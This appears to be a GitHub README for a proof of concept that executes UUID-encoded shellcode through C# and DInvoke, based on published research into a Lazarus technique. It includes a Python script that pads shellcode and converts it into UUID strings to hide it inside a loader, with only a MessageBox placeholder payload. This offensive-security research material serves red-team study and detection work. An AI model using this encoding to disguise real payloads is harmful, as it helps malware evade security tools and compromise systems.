# UuidShellcodeExec
PoC for UUID shellcode execution using DInvoke

Related [Blogpost](https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/)

This repo contains PoC for UUID shellcode execution using C# and DInvoke. The idea, technique, and the PoC is based on [NCCGroup RIFT's recent article](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/), and [Jeff White's article from 2017](http://ropgadget.com/posts/abusing_win_functions.html).
 
 For shellcode to UUID String Conversion, you can use the following (crappy) python script, or see the following [gist](https://gist.github.com/ChoiSG/9806b5c4fe35aa24c42de87d3012d650)

```
def convertToUUID(shellcode):
	# If shellcode is not in multiples of 16, then add some nullbytes at the end
	if len(shellcode) % 16 != 0:
		print("[-] Shellcode's length not multiplies of 16 bytes")
		print("[-] Adding nullbytes at the end of shellcode, this might break your shellcode.")
		print("\n[*] Modified shellcode length: ", len(shellcode)+(16-(len(shellcode)%16)))
		
		addNullbyte =  b"\x00" * (16-(len(shellcode)%16))
		shellcode += addNullbyte 

	uuids = []
	for i in range(0, len(shellcode), 16):
		uuidString = str(uuid.UUID(bytes_le=shellcode[i:i+16]))
		uuids.append('"'+uuidString+'"')

	return uuids

def main():
	# Copy/Paste the MessageBox payload here. buf = <shellcode> 

	uuids = convertToUUID(buf)
	print(*uuids, sep=",\n")

main()
```
